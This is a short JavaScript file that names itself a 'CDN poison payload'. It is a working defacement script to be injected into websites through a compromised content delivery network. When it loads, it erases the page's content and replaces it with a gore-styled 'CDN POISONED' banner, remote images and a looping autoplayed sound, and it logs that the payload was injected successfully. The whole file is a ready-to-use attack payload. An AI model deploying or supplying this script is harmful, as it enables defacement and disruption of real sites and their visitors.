// evil.js — HELLSTORM CDN POISON PAYLOAD (GORE PRO)

(() => {
  const style = document.createElement('style');
  style.innerHTML = `
    @keyframes blood {
      0% { background-position: 0 0; }
      100% { background-position: 0 100vh; }
    }

    @keyframes glitch {
      0% { transform: scale(1); }
      50% { transform: scale(1.03) rotate(1deg); }
      100% { transform: scale(1); }
    }

    body {
      margin: 0;
      padding: 0;
      background: url('https://i.imgur.com/1mYIuQF.png') repeat;
      animation: blood 15s linear infinite;
      color: red;
      font-family: monospace;
      text-align: center;
      padding-top: 10vh;
    }

    .hellstorm-title {
      font-size: 48px;
      text-shadow: 2px 2px black;
      animation: glitch 1s infinite;
    }

    .subtitle {
      font-size: 22px;
      margin-bottom: 20px;
    }

    .icon {
      width: 80px;
      margin: 10px;
      filter: drop-shadow(2px 2px 4px black);
    }

    .gif {
      margin-top: 30px;
      border: 2px solid red;
      box-shadow: 0 0 10px red;
    }
  `;
  document.head.appendChild(style);

  const container = document.createElement("div");
  container.innerHTML = `
    <div class="hellstorm-title">💀 CDN POISONED 💀</div>
    <div class="subtitle">THIS RESOURCE HAS BEEN COMPROMISED</div>
    <img src="https://cdn-icons-png.flaticon.com/512/2765/2765273.png" class="icon" />
    <img src="https://media.giphy.com/media/QHE5gWI0QjqF2/giphy.gif" class="gif" width="280" />
  `;
  document.body.innerHTML = '';
  document.body.appendChild(container);

  // Optional chaos sound — can be commented if not needed
  const audio = document.createElement('audio');
  audio.src = 'https://www.myinstants.com/media/sounds/vine-boom.mp3';
  audio.autoplay = true;
  audio.loop = true;
  document.body.appendChild(audio);

  console.log("💉 HELLSTORM GORE PAYLOAD INJECTED SUCCESSFULLY");
})();


